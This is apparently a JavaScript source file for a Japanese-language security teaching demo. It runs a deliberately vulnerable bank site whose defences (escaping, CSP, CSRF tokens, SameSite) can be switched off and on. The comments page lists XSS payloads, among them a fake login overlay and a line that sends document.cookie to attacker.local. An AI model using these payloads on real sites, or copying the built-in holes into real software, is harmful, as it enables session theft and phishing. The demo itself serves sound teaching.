// bank.local:3000
const express = require('express')
const crypto = require('crypto')

const app = express()
app.use(express.urlencoded({ extended: true }))

// --- In-memory state ---
const sessions = {}
const comments = []
let csrfProtection = true
let sameSite = 'lax'
let xssProtection = false  // false = innerHTML（危険）, true = escapeHtml（安全）
let cspEnabled = false     // true = Content-Security-Policy ヘッダーを付与

// --- CSP middleware ---
app.use((req, res, next) => {
  if (cspEnabled) {
    // unsafe-inline を許可しない → onerror などのインラインスクリプトをブロック
    res.setHeader('Content-Security-Policy', "script-src 'self'")
  }
  next()
})

// --- Helpers ---
function getSession(req) {
  const raw = req.headers.cookie || ''
  const cookies = Object.fromEntries(
    raw.split(';').filter(Boolean).map(c => c.trim().split('='))
  )
  return sessions[cookies.session]
}

function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

// --- Routes ---

app.get('/', (req, res) => {
  const session = getSession(req)
  const flash = session?._flash || null
  if (session) delete session._flash
  res.send(session ? dashboard(session, flash) : loginPage())
})

app.post('/login', (req, res) => {
  const { username, password } = req.body
  if (password !== 'pass') return res.send('パスワードが違います')
  const sessionId = crypto.randomBytes(16).toString('hex')
  const csrfToken = crypto.randomBytes(16).toString('hex')
  sessions[sessionId] = { username, balance: 10000, csrfToken, log: [] }
  res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; SameSite=${sameSite}; Path=/`)
  res.redirect('/')
})

app.post('/transfer', (req, res) => {
  const session = getSession(req)
  if (!session) {
    return res.status(401).send(`
      <div style="padding:40px;font-family:sans-serif;text-align:center">
        <h2 style="color:#27ae60">✅ SameSite が効いています</h2>
        <p>別サイトからのリクエストにはCookieが付かないため、未ログイン扱いになりました。</p>
        <a href="/">戻る</a>
      </div>`)
  }

  const { to, amount, csrf_token } = req.body

  if (csrfProtection && csrf_token !== session.csrfToken) {
    session._flash = { type: 'blocked', msg: `CSRFトークン不一致 → ${to} への ¥${amount} をブロックしました` }
    session.log.push(`🛡️ 送金ブロック → ${to} へ ¥${amount}（CSRFトークン不一致）`)
    return res.redirect('/')
  }

  const amt = parseInt(amount)
  session.balance -= amt
  session._flash = { type: 'danger', msg: `¥${amt} が ${to} に送金されました（攻撃成功）` }
  session.log.push(`💸 送金完了 → ${to} へ ¥${amt}`)
  res.redirect('/')
})

app.post('/comments', (req, res) => {
  comments.push(req.body.comment || '')
  res.redirect('/')
})

app.get('/comments', (req, res) => res.send(commentsPage()))

// --- Toggle routes ---
app.get('/toggle-csrf',    (req, res) => { csrfProtection = !csrfProtection; res.redirect('/') })
app.get('/toggle-xss',     (req, res) => { xssProtection = !xssProtection; res.redirect('/') })
app.get('/toggle-csp',     (req, res) => { cspEnabled = !cspEnabled; res.redirect('/') })
app.get('/toggle-samesite',(req, res) => {
  sameSite = sameSite === 'strict' ? 'lax' : 'strict'
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})

app.get('/reset-comments', (req, res) => { comments.length = 0; res.redirect('/') })
app.get('/logout',  (req, res) => { res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/'); res.redirect('/') })
app.get('/reset',   (req, res) => {
  const session = getSession(req)
  if (session) { session.balance = 10000; session.log = [] }
  res.redirect('/')
})

// --- HTML ---

function css() {
  return `<style>
    * { box-sizing: border-box; }
    body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding-bottom: 60px; }
    .wrap { max-width: 860px; margin: 32px auto; background: white; padding: 32px; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
    h1 { margin: 0 0 4px; font-size: 22px; }
    .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
    input, textarea { display: block; width: 100%; margin: 6px 0 12px; padding: 9px 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
    button, .btn { background: #2c3e50; color: white; border: none; padding: 9px 18px; border-radius: 6px; cursor: pointer; font-size: 14px; text-decoration: none; display: inline-block; }
    button:hover, .btn:hover { background: #34495e; }
    .btn-sm { font-size: 12px; padding: 4px 12px; margin-left: 8px; background: #7f8c8d; border-radius: 4px; color: white; text-decoration: none; display: inline-block; }
    .panel { border: 2px solid #e9ecef; border-radius: 8px; margin: 20px 0; overflow: hidden; }
    .panel-head { background: #f8f9fa; padding: 12px 16px; font-weight: bold; font-size: 14px; border-bottom: 1px solid #e9ecef; }
    .panel-body { padding: 12px 16px; }
    .row { display: flex; align-items: center; gap: 12px; padding: 8px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
    .row:last-child { border-bottom: none; }
    .row-label { flex: 1; }
    .row-note { font-size: 12px; color: #888; margin-top: 2px; }
    .tag-on  { background: #d4edda; color: #155724; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; }
    .tag-off { background: #f8d7da; color: #721c24; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; }
    .flash { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 15px; font-weight: bold; }
    .flash-danger  { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    .flash-blocked { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .comment-item { border-left: 3px solid #ddd; padding: 6px 10px; margin: 5px 0; font-size: 14px; border-radius: 0 4px 4px 0; background: #fafafa; }
    .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
    .col { padding: 16px; border-radius: 8px; }
    .col-bad  { background: #fdf2f2; border: 1px solid #f5c6c6; }
    .col-good { background: #f2fdf4; border: 1px solid #c6eece; }
    .col h3 { margin: 0 0 8px; font-size: 14px; }
    .preset code { background: #1e1e1e; color: #d4d4d4; padding: 8px 12px; border-radius: 6px; font-size: 12px; display: block; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
    .preset p { margin: 10px 0 4px; font-size: 13px; font-weight: bold; }
    .preset .note { font-size: 12px; color: #888; font-weight: normal; }
    .balance { font-size: 28px; font-weight: bold; color: #2c3e50; }
    code { background: #f0f0f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
    ul { padding-left: 20px; }
    li { margin: 4px 0; font-size: 14px; }
    hr { border: none; border-top: 1px solid #eee; margin: 24px 0; }
    .footer-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #2c3e50; color: #ccc; padding: 10px 24px; font-size: 13px; }
    .footer-bar a { color: #5dade2; }
    .section-title { font-size: 15px; font-weight: bold; margin: 24px 0 8px; display: flex; align-items: center; gap: 8px; }
    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: normal; }
    .badge-danger { background: #f8d7da; color: #721c24; }
    .badge-safe   { background: #d4edda; color: #155724; }
  </style>`
}

function loginPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank（victim）</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.local</h1>
  <p class="sub">port 3000 — 被害者サイト（銀行）</p>
  <p>ユーザー名：何でもOK ／ パスワード：<strong>pass</strong></p>
  <form method="POST" action="/login">
    <input name="username" value="alice" placeholder="ユーザー名">
    <input name="password" type="password" value="pass" placeholder="パスワード">
    <button type="submit">ログイン</button>
  </form>
</div>
</body></html>`
}

function dashboard(session, flash) {
  const commentHtml = comments.length
    ? comments.slice(-5).map(c =>
        `<div class="comment-item">${xssProtection ? escapeHtml(c) : c}</div>`
      ).join('')
    : `<p style="color:#aaa;font-size:13px">まだコメントなし — <a href="/comments">コメントを投稿する</a></p>`

  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank Dashboard</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.local</h1>
  <p class="sub">port 3000 — ${escapeHtml(session.username)} さんがログイン中</p>

  ${flash ? `<div class="flash flash-${flash.type}">${flash.type === 'blocked' ? '🛡️' : '💀'} ${escapeHtml(flash.msg)}</div>` : ''}

  <p>残高 <span class="balance" id="balance">¥${session.balance.toLocaleString()}</span>
    <a href="/reset" class="btn-sm">残高リセット</a>
  </p>

  <!-- 対策パネル -->
  <div class="panel">
    <div class="panel-head">🛡️ 対策パネル — ON/OFF を切り替えて攻撃の成否を確認する</div>
    <div class="panel-body">

      <div class="row">
        <div class="row-label">
          <div>XSS保護（エスケープ）</div>
          <div class="row-note">${xssProtection ? '✅ コメントをテキストとして表示 → タグが無害化される' : '❌ コメントをHTMLとして挿入 → スクリプトが実行される'}</div>
        </div>
        <span class="${xssProtection ? 'tag-on' : 'tag-off'}">${xssProtection ? 'ON' : 'OFF'}</span>
        <a href="/toggle-xss" class="btn-sm">切り替え</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>CSP（Content Security Policy）</div>
          <div class="row-note">${cspEnabled ? '✅ インラインスクリプトの実行をブラウザがブロック → エスケープ漏れがあっても実行されない' : '❌ スクリプトの実行制限なし'}</div>
        </div>
        <span class="${cspEnabled ? 'tag-on' : 'tag-off'}">${cspEnabled ? 'ON' : 'OFF'}</span>
        <a href="/toggle-csp" class="btn-sm">切り替え</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>CSRFトークン</div>
          <div class="row-note">${csrfProtection ? '✅ 秘密値を照合 → 別サイトからの偽造リクエストをブロック' : '❌ トークン検証なし → 別サイトからのリクエストが通る'}</div>
        </div>
        <span class="${csrfProtection ? 'tag-on' : 'tag-off'}">${csrfProtection ? 'ON' : 'OFF'}</span>
        <a href="/toggle-csrf" class="btn-sm">切り替え</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>SameSite Cookie</div>
          <div class="row-note">${sameSite === 'strict' ? '✅ strict — 別サイトからのリクエストにCookieを付けない → 未ログイン扱いになる' : '⚠️ lax — fetch/POSTには付けないがGET遷移には付く'}</div>
        </div>
        <span class="${sameSite === 'strict' ? 'tag-on' : 'tag-off'}">${sameSite}</span>
        <a href="/toggle-samesite" class="btn-sm">切り替え（再ログイン）</a>
      </div>

    </div>
  </div>

  <!-- 送金フォーム（CSRF対象） -->
  <div class="section-title">送金フォーム <span class="badge badge-danger">← CSRFの標的</span></div>
  <form method="POST" action="/transfer" style="display:flex;gap:8px;align-items:flex-end">
    <div style="flex:1"><input name="to" placeholder="送金先口座" style="margin:0"></div>
    <div style="width:120px"><input name="amount" type="number" value="3000" style="margin:0"></div>
    ${csrfProtection ? `<input type="hidden" name="csrf_token" value="${session.csrfToken}">` : ''}
    <button type="submit" style="white-space:nowrap">送金する</button>
  </form>

  ${session.log.length ? `
  <div style="margin-top:12px">
    <ul style="margin:0">${session.log.slice(-5).map(l => `<li>${escapeHtml(l)}</li>`).join('')}</ul>
  </div>` : ''}

  <!-- コメント欄（XSS着弾点） -->
  <div class="section-title">
    最新コメント
    <span class="badge ${xssProtection ? 'badge-safe' : 'badge-danger'}">${xssProtection ? '✅ エスケープあり（安全）' : '❌ エスケープなし（XSS着弾点）'}</span>
    <a href="/reset-comments" class="btn-sm" style="margin-left:auto">コメントクリア</a>
  </div>
  <div id="comments-area">${commentHtml}</div>
  <div style="margin-top:12px">
    <a href="/comments" class="btn">💬 コメントを投稿する（XSSデモ）</a>
    <a href="/logout" class="btn-sm">ログアウト</a>
  </div>

</div>
<div class="footer-bar">
  CSRFを試すには → <a href="http://attacker.local:3001" target="_blank">attacker.local:3001（攻撃者サイト）</a> を開く
</div>
</body></html>`
}

function commentsPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>コメント投稿（XSSデモ）</title>${css()}</head><body>
<div class="wrap">
  <h1>💬 コメントを投稿する</h1>
  <p class="sub">投稿するとダッシュボードに戻ります。仕込んだコードが <strong>銀行の画面で</strong> 実行されます。</p>

  <form method="POST" action="/comments">
    <textarea name="comment" rows="3" placeholder="ペイロードをここに貼り付けて投稿..."></textarea>
    <button type="submit">投稿してダッシュボードへ</button>
  </form>

  <div class="preset">
    <p>① アラートを出す（動作確認）</p>
    <code>&lt;img src=x onerror="alert('XSS: bank.local で実行されました')"&gt;</code>

    <p>② 残高を書き換える</p>
    <code>&lt;img src=x onerror="document.getElementById('balance').textContent='¥0'"&gt;</code>

    <p>③ 画面を偽のログインフォームで乗っ取る</p>
    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:80px;text-align:center;font-family:sans-serif&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px;width:200px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px;width:200px&gt;&lt;button style=padding:8px 24px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>

    <p>④ Cookieを attacker.local に送信する <span class="note">（HttpOnly が有効なら空になる）</span></p>
    <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>

    <p style="margin-top:16px;color:#27ae60">対策を試すには：</p>
    <p class="note">ダッシュボードの対策パネルで「XSS保護」または「CSP」を ON にしてから、同じペイロードを再投稿してみる</p>
  </div>

  <a href="/">← ダッシュボードへ戻る</a>
</div>
</body></html>`
}

app.listen(3000, () => {
  console.log('victim (bank): http://bank.local:3000')
})
